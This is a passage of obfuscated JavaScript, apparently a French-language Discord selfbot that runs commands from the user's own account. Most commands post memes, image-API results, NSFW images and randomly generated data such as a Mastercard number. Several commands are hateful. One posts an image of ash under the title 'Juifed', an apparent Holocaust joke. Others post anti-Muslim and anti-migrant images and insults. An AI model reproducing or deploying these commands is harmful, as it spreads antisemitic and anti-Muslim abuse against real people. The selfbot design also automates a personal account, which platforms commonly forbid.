                            cg.delete(), cg.channel.send('' + aP.twitter());
                          }
                        }
                        if (cg.content === ab + 'name') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            let lg;
                            cg.mentions.users.first() ? lg = cg.mentions.users.first() : lg = cg.author;
                            var e0 = aaa.slice(1, 5);
                            cg.channel.send();
                          }
                        }
                        cg.content === ab + 'gtwitter' && cg.author.id === aN.user.id && (cg.delete(), cg.channel.send('' + aP.twitter()));
                        var e1 = aP.cc(),
                          e2 = {};
                        e2.type = 'Mastercard', aP.cc(e2);
                        if (cg.content === ab + 'mastercard') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) cg.delete(), cg.channel.send('' + e1);else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        var e3 = aP.animal(),
                          e4 = {};
                        e4.type = 'zoo', aP.animal(e4);
                        if (cg.content === ab + 'animal') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete(), cg.channel.send('' + e3);
                          }
                        }
                        var e5 = {};
                        e5.format = '0x';
                        var e6 = aP.color(e5);
                        if (cg.content === ab + 'randomcolor') {
                          cg.author.id === aN.user.id && (cg.delete(), cg.channel.send('' + e6));
                        }
                        var e7 = {};
                        e7.domain = 'gmail.com';
                        var e8 = aP.email(e7);
                        if (cg.content === ab + 'email') {
                          cg.author.id === aN.user.id && (cg.delete(), cg.channel.send('' + e8));
                        }
                        if (cg.content === ab + 'space') {
                          if (cg.author.id === aN.user.id) {
                            var e9 = d8.join(' ');
                            let lo = e9;
                            cg.edit(lo.split('').join(' '));
                          }
                        }
                        if (cg.content === ab + 'gangster') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var ea = new aw.RichEmbed().setImage('https://pbs.twimg.com/profile_images/1175344407761031170/UXiUwSKK_400x400.jpg').setColor(ad).setTitle('**Clakos le gangster**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(ea);
                          }
                        }
                        if (cg.content === ab + 'juifed') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var eb = new aw.RichEmbed().setImage('https://previews.123rf.com/images/buriy/buriy1508/buriy150800023/43739845-poign%C3%A9e-de-cendre-grise-sur-fond-blanc.jpg').setColor(ad).setTitle('**Juifed**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(eb);
                          }
                        }
                        if (cg.content === ab + 'migrant') {
                          if (cg.author.id === aN.user.id) {
                            var ec = ['https://cdn.discordapp.com/attachments/681115950912897084/683624550231048202/IMG_20200301_113936.png', 'https://cdn.discordapp.com/attachments/681115950912897084/683624550721912836/IMG_20200301_113909.png', 'https://cdn.discordapp.com/attachments/681115950912897084/683624550990217223/IMG_20200301_113811.png', 'https://cdn.discordapp.com/attachments/681115950912897084/683624551283687479/IMG_20200301_113738.png'];
                            ec[Math.floor(Math.random() * ec.length)];
                            const ls = new aw.RichEmbed().setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setAuthor('c\'est quoi ça là bas... \nO PTN DES MIGRANTS').setImage(ec[Math.floor(Math.random() * ec.length)]);
                            cg.edit(ls).catch(lu => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                          }
                        }
                        if (cg.content === ab + 'musulman') {
                          if (cg.author.id === aN.user.id) {
                            var ec = ['https://cdn.discordapp.com/attachments/675415867026309161/682244268953174025/image0-4.jpg', 'https://cdn.discordapp.com/attachments/681417600407699466/682482297403998218/stgeorges6.png', 'https://cdn.discordapp.com/attachments/681417600407699466/682483677032480808/anigif_enhanced-14060-1429803711-3.gif'];
                            ec[Math.floor(Math.random() * ec.length)];
                            const lu = new aw.RichEmbed().setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setAuthor('anti musulman!!!').setImage(ec[Math.floor(Math.random() * ec.length)]);
                            cg.edit(lu).catch(lv => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                          }
                        }
                        if (cg.content === ab + 'gpalu') {
                          if (cg.author.id === aN.user.id) {
                            var ec = ['https://cdn.discordapp.com/attachments/681115950912897084/683626151260061744/2413-full.gif', 'https://cdn.discordapp.com/attachments/681115950912897084/683626152191066140/10135-full.gif', 'https://cdn.discordapp.com/attachments/681115950912897084/683626152446656572/telechargement.jpeg'];
                            ec[Math.floor(Math.random() * ec.length)];
                            const lv = new aw.RichEmbed().setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setAuthor('g pas lu :)').setImage(ec[Math.floor(Math.random() * ec.length)]);
                            cg.edit(lv).catch(lw => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                          }
                        }
                        if (cg.content.startsWith(ab + 'morse')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(1);
                            if (!d8) {
                              cg.edit('un argument est nécessaire');
                            }
                            let lx = ' ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890?!¡#$%⅋,)(*+\'-˙/:;<=>?@[/]^_`{|}~'.split(''),
                              ly = '/,.-,-...,-.-.,-..,.,..-.,--.,....,..,.---,-.-,.-..,--,-.,---,.--.,--.-,.-.,...,-,..-,...-,.--,-..-,-.--,--..,.----,..---,...--,....-,.....,-....,--...,---..,----.,-----,?,!,¡,#,$,%,⅋,,,),(,*,+,,\',-,˙,/,:,;,<,=,>,?,@,[,/,],^,_,`,{,|,},~'.split(','),
                              lz = d8.join(' ').toUpperCase();
                            while (lz.includes('Ä') || lz.includes('Ç') || lz.includes('Ê') || lz.includes('Ù') || lz.includes('Ö') || lz.includes('É') || lz.includes('Ü')) {
                              lz = lz.replace('Ä', 'AE').replace('Ç', 'C').replace('Ê', 'E').replace('Ù', 'U').replace('Ö', 'OE').replace('É', 'E').replace('Ü', 'UE');
                            }
                            if (lz.startsWith('.') || lz.startsWith('-')) {
                              lz = lz.split(' ');
                              let lC = lz.length;
                              for (cy = 0; cy < lC; cy++) {
                                lz[cy] = lx[ly.indexOf(lz[cy])];
                              }
                              lz = lz.join('');
                            } else {
                              lz = lz.split('');
                              let lD = lz.length;
                              for (cy = 0; cy < lD; cy++) {
                                lz[cy] = ly[lx.indexOf(lz[cy])];
                              }
                              lz = lz.join(' ');
                            }
                            cg.edit('```' + lz + '```');
                          }
                        }
                        if (cg.content.startsWith(ab + 'grand')) {
                          if (cg.author.id === cg.author.id) {
                            const lE = cg.content.split(' ').slice(1);
                            !lE && cg.edit('***un argument est nécessaire***');
                            let lF = ' ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890?!¡#$%⅋,)(*+\'-˙/:;<=>?@[/]^_`{|}~'.split(''),
                              lG = ' ,🇦,🇧,🇨,🇩,🇪,🇫,🇬,🇭,🇮,🇯,🇰,🇱,🇲,🇳,🇴,🇵,🇶,🇷,🇸,🇹,🇺,🇻,🇼,🇽,🇾,🇿,1️⃣,2️⃣,3️⃣,4️⃣,5️⃣,6️⃣,7️⃣,8️⃣,9️⃣,0️⃣,❓,❗,❗,#,💲,%,⅋,,,),(,*,+,,\',-,˙,/,:,;,<,=,>,?,@,[,/,],^,_,`,{,|,},~'.split(','),
                              lH = lE.join(' ').toUpperCase();
                            while (lH.includes('Ä') || lH.includes('Ç') || lH.includes('Ê') || lH.includes('Ù') || lH.includes('Ö') || lH.includes('É') || lH.includes('Ü')) {
                              lH = lH.replace('Ä', 'AE').replace('Ç', 'C').replace('Ê', 'E').replace('Ù', 'U').replace('Ö', 'OE').replace('É', 'E').replace('Ü', 'UE');
                            }
                            if (lH.startsWith('.') || lH.startsWith('-')) {
                              lH = lH.split(' ');
                              let lJ = lH.length;
                              for (cy = 0; cy < lJ; cy++) {
                                lH[cy] = lF[lG.indexOf(lH[cy])];
                              }
                              lH = lH.join('');
                            } else {
                              lH = lH.split('');
                              let lK = lH.length;
                              for (cy = 0; cy < lK; cy++) {
                                lH[cy] = lG[lF.indexOf(lH[cy])];
                              }
                              lH = lH.join(' ');
                            }
                            return cg.edit('' + lH + '');
                          }
                        }
                        if (cg.content.startsWith(ab + 'croix')) {
                          if (cg.author.id === aN.user.id) {
                            const lO = cg.content.split(' ').slice(1).join(' ');
                            if (!lO[0]) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                            cg.delete(), cg.channel.send('' + lO + lO + lO + lO + '           ' + lO + '\n                ' + lO + '           ' + lO + '\n                ' + lO + '           ' + lO + '\n' + lO + lO + lO + lO + lO + lO + lO + '\n' + lO + '           ' + lO + '\n' + lO + '           ' + lO + '\n' + lO + '           ' + lO + lO + lO + lO);
                          }
                        }
                        if (cg.content.startsWith(ab + 'coeur')) {
                          if (cg.author.id === aN.user.id) {
                            const lP = cg.content.split(' ').slice(1).join(' ');
                            if (!lP[0]) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                            cg.delete(), cg.channel.send('' + lP + lP + '          ' + lP + lP + '\n' + lP + lP + lP + '   ' + lP + lP + lP + '\n' + lP + ' ' + lP + ' ' + lP + ' ' + lP + ' ' + lP + ' ' + lP + '\n   ' + lP + ' ' + lP + ' ' + lP + ' ' + lP + ' ' + lP + '\n     ' + lP + lP + lP + lP + lP + '\n       ' + lP + lP + lP + lP + '\n         ' + lP + lP + lP + '\n             ' + lP + lP + '\n               ' + lP);
                          }
                        }
                        if (cg.content.startsWith(ab + 'bite-ascii')) {
                          if (cg.author.id === aN.user.id) {
                            const lR = cg.content.split(' ').slice(1).join(' ');
                            if (!lR[0]) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                            cg.delete(), cg.channel.send('' + lR + lR + lR + '\n' + lR + '        ' + lR + '\n' + lR + '     ' + lR + lR + lR + lR + lR + lR + lR + lR + '\n' + lR + lR + lR + '                                     ' + lR + '\n' + lR + '     ' + lR + lR + lR + lR + lR + lR + lR + lR + '\n' + lR + '        ' + lR + '\n' + lR + lR + lR);
                          }
                        }
                        if (cg.content === ab + 'chomeur') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setImage('https://gyazo.com/cd41d3f3c5bf09ac6a5b243b0a95b30d').setColor(ad).setTitle('**Trouve toi une passion sale chômeur**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'arouf') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setImage('https://cdn.discordapp.com/attachments/712645028467441678/716429586396610587/ibaBomRK_400x400.jpg').setColor(ad).setTitle('**Roi Arouf, Présent ! **').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'choquer') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setImage('https://media.giphy.com/media/L3dFSQunjK7GSgaWQi/giphy.gif').setColor(ad).setTitle('**Choquer**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'con') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('**ptn t vrm trop con toi...**').setImage('https://media.giphy.com/media/l0HlCs6vEYrT4IOXK/giphy.gif').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'invitebot')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.mentions.users.first() ? user = cg.mentions.users.first() : user = cg.author, cg.channel.send('https://discordapp.com/api/oauth2/authorize?client_id=' + user.id + '&permissions=0&scope=bot');
                          }
                        }
                        if (cg.content.includes(ab + 'hug')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            aD.get('https://some-random-api.ml/animu/hug').then(lW => {
                              var lZ = lW.body.link;
                              if (cg.mentions.users.first()) {
                                user = cg.mentions.users.first();
                              } else {
                                user = cg.author;
                              }
                              var m0 = new aw.RichEmbed().setTitle(aN.user.username + ' *te fais un groooos Câlinn* ' + user.username).setDescription('').setImage(lZ).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.channel.send(m0);
                            });
                          }
                        }
                        if (cg.content.includes(ab + 'bontoutou')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            if (cg.mentions.users.first()) user = cg.mentions.users.first();else {
                              user = cg.author;
                            }
                            var cq = new aw.RichEmbed().setTitle(' ' + user.username + ' *tu es un Bon toutou*').setDescription('').setImage('https://ih1.redbubble.net/image.1072352245.5105/st,small,507x507-pad,600x600,f8f8f8.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'meme') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            randomPuppy('memes').then(lZ => {
                              const m0 = new aw.RichEmbed().setTimestamp().setTitle(aN.user.username + ' ** meme random **').setImage(lZ).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              var m1 = {};
                              m1.embed = m0, cg.channel.send(m1);
                            });
                          }
                        }
                        cg.content === ab + 'cat' && cg.author.id === aN.user.id && aD.get('http://aws.random.cat/meow').then(lZ => {
                          var m0 = lZ.body.file,
                            m1 = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random Cat **').setImage(m0).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(m1);
                        });
                        if (cg.content === ab + 'cum') {
                          if (cg.author.id === aN.user.id) {
                            if (ag.includes('on')) {
                              aD.get('https://nekos.life/api/v2/img/cum').then(lZ => {
                                var m0 = lZ.body.url,
                                  m1 = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random cum**').setImage(m0).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(m1);
                              });
                            } else cg.edit(cr);
                          }
                        }
                        if (cg.content === ab + 'nekolewd') {
                          cg.author.id === aN.user.id && (ag.includes('on') ? aD.get('https://neko-love.xyz/api/v1/nekolewd').then(m2 => {
                            var m5 = m2.body.url,
                              m6 = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random nekolewd**').setImage(m5).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(m6);
                          }) : cg.edit(cr));
                        }
                        cg.content === ab + 'lesbian' && cg.author.id === aN.user.id && (ag.includes('on') ? aD.get('https://nekos.life/api/v2/img/les').then(m2 => {
                          var m3 = m2.body.url,
                            m4 = new aw.RichEmbed().setTitle(aN.user.username + ' **Random lesbian**').setImage(m3).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(m4);
                        }) : cg.edit(cr));
                        cg.content === ab + 'feed' && cg.author.id === aN.user.id && aD.get('https://nekos.life/api/v2/img/feed').then(m2 => {
                          var m5 = m2.body.url,
                            m6 = new aw.RichEmbed().setTitle(aN.user.username + ' **Random feed**').setImage(m5).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(m6);
                        });
                        if (cg.content === ab + 'tickle') {
                          if (cg.author.id === aN.user.id) {
                            if (ag.includes('on')) aD.get('https://nekos.life/api/v2/img/tickle').then(m2 => {
                              var m3 = m2.body.url,
                                m4 = new aw.RichEmbed().setTitle(aN.user.username + ' **Random tickle**').setImage(m3).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(m4);
                            });else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content === ab + 'slap') {
                          if (cg.author.id === aN.user.id) {
                            aD.get('https://nekos.life/api/v2/img/slap').then(m6 => {
                              var m7 = m6.body.url,
                                m8 = new aw.RichEmbed().setTitle(aN.user.username + ' **Random slap**').setImage(m7).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(m8);
                            });
                          }
                        }
                        if (cg.content === ab + 'blowjob') {
                          if (cg.author.id === aN.user.id) {
                            if (ag.includes('on')) {
                              aD.get('https://nekos.life/api/v2/img/blowjob').then(m7 => {
                                var m8 = m7.body.url,
                                  m9 = new aw.RichEmbed().setTitle(aN.user.username + ' **Random blowjob**').setImage(m8).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(m9);
                              });
                            } else cg.edit(cr);
                          }
                        }
                        if (cg.content === ab + 'tits') {
                          if (cg.author.id === aN.user.id) {
                            if (ag.includes('on')) {
                              aD.get('https://nekos.life/api/v2/img/tits').then(m9 => {
                                var ma = m9.body.url,
                                  mb = new aw.RichEmbed().setTitle(aN.user.username + ' **Random tits**').setImage(ma).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(mb);
                              });
                            } else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content === ab + 'boobs') {
                          if (cg.author.id === aN.user.id) {
                            if (ag.includes('on')) {
                              aD.get('https://nekos.life/api/v2/img/boobs').then(mb => {
                                var mc = mb.body.url,
                                  md = new aw.RichEmbed().setTitle(aN.user.username + ' **Random boobs**').setImage(mc).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(md);
                              });
                            } else {
                              cg.edit(cr);
                            }
                          }
                        }
                        if (cg.content === ab + 'hentai') {
                          if (cg.author.id === aN.user.id) {
                            if (ag.includes('on')) {
                              aD.get('https://nekos.life/api/v2/img/Random_hentai_gif').then(me => {
                                var mf = me.body.url,
                                  mg = new aw.RichEmbed().setTitle(aN.user.username + ' **Random hentai**').setImage(mf).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(mg);
                              });
                            } else cg.edit(cr);
                          }
                        }
                        if (cg.content === ab + 'wallpaper') {
                          cg.author.id === aN.user.id && aD.get('https://nekos.life/api/v2/img/wallpaper').then(mf => {
                            var mg = mf.body.url,
                              mh = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random wallpaper**').setImage(mg).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(mh);
                          });
                        }
                        if (cg.content.startsWith(ab + 'phlogo')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0),
                              ed = cN.slice(2);
                            let mg = d8[1];
                            var cq = new aw.RichEmbed().setTitle(aN.user.username + ' **PH LOGO**').setImage('https://api.alexflipnote.dev/pornhub?text=' + mg + '&text2=' + ed.join('%20')).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'suprem')) {
                          if (cg.author.id === aN.user.id) {
                            let mi = cg.content.split(' ');
                            mi.shift();
                            var cq = new aw.RichEmbed().setTitle(aN.user.username + ' **Suprem**').setImage('https://api.alexflipnote.dev/supreme?text=' + mi.join('%20')).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'tweet')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let mk = d8[1],
                              ml = d8.slice(2).join(' ') || undefined;
                            aD.get('https://nekobot.xyz/api/imagegen?type=tweet&username=' + mk + '&text=' + ml).then(mm => {
                              var mn = mm.body.message,
                                mo = new aw.RichEmbed().setTitle(aN.user.username + ' ** TWEET **').setImage(mn).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mo);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'trumptweet')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                d8 = cN.slice(0);
                              let mm = d8.slice(1).join(' ') || undefined;
                              aD.get('https://nekobot.xyz/api/imagegen?type=trumptweet&text=' + mm).then(mn => {
                                var mo = mn.body.message,
                                  mp = new aw.RichEmbed().setTitle(aN.user.username + ' ** TRUMP TWEET **').setImage(mo).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(mp);
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'clyde')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let mn = d8.slice(1).join(' ') || undefined;
                            aD.get('https://nekobot.xyz/api/imagegen?type=clyde&text=' + mn).then(mo => {
                              var mp = mo.body.message,
                                mq = new aw.RichEmbed().setTitle(aN.user.username + ' ** Clyde **').setImage(mp).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mq);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'changemind')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let mo = d8.slice(1).join(' ') || undefined;
                            aD.get('https://nekobot.xyz/api/imagegen?type=changemymind&text=' + mo).then(mp => {
                              var mq = mp.body.message,
                                mr = new aw.RichEmbed().setTitle(aN.user.username + ' ** Changemind **').setImage(mq).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mr);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'kannagen')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let mp = d8.slice(1).join(' ') || undefined;
                            aD.get('https://nekobot.xyz/api/imagegen?type=kannagen&text=' + mp).then(mq => {
                              var mr = mq.body.message,
                                ms = new aw.RichEmbed().setTitle(aN.user.username + ' ** kannagen **').setImage(mr).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(ms);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'imagecaptcha')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                d8 = cN.slice(0);
                              let mr = d8.slice(1).join(' ') || undefined;
                              var cT = cg.author.avatarURL;
                              aD.get('https://nekobot.xyz/api/imagegen?type=captcha&url=' + cT + '&username=' + mr).then(ms => {
                                var mt = ms.body.message,
                                  mu = new aw.RichEmbed().setTitle(aN.user.username + ' **CAPTCHA**').setImage(mt).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(mu);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'baguette')) {
                          if (cg.author.id === aN.user.id) {
                            var cT = cg.author.avatarURL;
                            aD.get('https://nekobot.xyz/api/imagegen?type=baguette&url=' + cT).then(mt => {
                              var mu = mt.body.message,
                                mv = new aw.RichEmbed().setTitle(aN.user.username + ' **baguette**').setImage(mu).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mv);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'threats')) {
                          if (cg.author.id === aN.user.id) {
                            var cT = cg.author.avatarURL;
                            aD.get('https://nekobot.xyz/api/imagegen?type=threats&url=' + cT).then(mt => {
                              var mu = mt.body.message,
                                mv = new aw.RichEmbed().setTitle(aN.user.username + ' **threats**').setImage(mu).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mv);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'jpeg')) {
                          if (cg.author.id === aN.user.id) {
                            let mu = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              mv = mu.displayAvatarURL;
                            aD.get('https://nekobot.xyz/api/imagegen?type=jpeg&url=' + mv).then(mw => {
                              var mx = mw.body.message,
                                my = new aw.RichEmbed().setTitle(aN.user.username + ' **jpeg format**').setImage(mx).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(my);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'awooify')) {
                          if (cg.author.id === aN.user.id) {
                            let my = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              mz = my.displayAvatarURL;
                            aD.get('https://nekobot.xyz/api/imagegen?type=awooify&url=' + mz).then(mA => {
                              var mB = mA.body.message,
                                mC = new aw.RichEmbed().setTitle(aN.user.username + ' **Awooify**').setImage(mB).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mC);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'iphonex')) {
                          if (cg.author.id === aN.user.id) {
                            let mA = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              mB = mA.displayAvatarURL;
                            aD.get('https://nekobot.xyz/api/imagegen?type=iphonex&url=' + mB).then(mC => {
                              var mF = mC.body.message,
                                mG = new aw.RichEmbed().setTitle(aN.user.username + ' **Iphonex**').setImage(mF).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mG);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'magik')) {
                          if (cg.author.id === aN.user.id) {
                            let mE = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              mF = mE.displayAvatarURL;
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let mG = d8.slice(2).join(' ') || undefined;
                            aD.get('https://nekobot.xyz/api/imagegen?type=magik&image=' + mF + '&intensity=' + mG).then(mH => {
                              var mI = mH.body.message,
                                mJ = new aw.RichEmbed().setTitle(aN.user.username + ' **Magik**').setImage(mI).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(mJ);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'phcomment')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let mH = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                                mI = mH.displayAvatarURL;
                              var cN = cg.content.split(' '),
                                d8 = cN.slice(0);
                              let mJ = d8[1],
                                mK = d8.slice(2).join(' ') || undefined;
                              aD.get('https://nekobot.xyz/api/imagegen?type=phcomment&image=' + mI + '&text=' + mK + '&username=' + mH.username).then(mL => {
                                var mM = mL.body.message,
                                  mN = new aw.RichEmbed().setTitle(aN.user.username + ' **Ph Comment**').setImage(mM).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(mN);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'threshold')) {
                          if (cg.author.id === aN.user.id) {
                            let mM = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              mN = mM.displayAvatarURL;
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let mO = d8[1],
                              mP = d8.slice(2).join('%20');
                            var cq = new aw.RichEmbed().setTitle(aN.user.username + ' **Threshold**').setImage('https://some-random-api.ml/canvas/threshold?avatar=' + mN).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'didyoumean')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                d8 = cN.slice(0);
                              let mS = d8[1],
                                mT = d8.slice(2).join(' ') || undefined;
                              var ee = 'https://api.alexflipnote.dev/didyoumean?top=' + mS + '&bottom=' + mT,
                                cq = new aw.RichEmbed().setImage(ee).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(cq);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'scroll')) {
                          if (cg.author.id === aN.user.id) {
                            let mV = cg.content.split(' ');
                            mV.shift();
                            var cq = new aw.RichEmbed().setImage('https://api.alexflipnote.dev/scroll?text=' + mV.join('%20')).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'captcha')) {
                          if (cg.author.id === aN.user.id) {
                            let mW = cg.content.split(' ');
                            mW.shift();
                            var cq = new aw.RichEmbed().setImage('https://api.alexflipnote.dev/captcha?text=' + mW.join('%20')).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'communist')) {
                          if (cg.author.id === aN.user.id) {
                            let mX = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              mY = mX.displayAvatarURL;
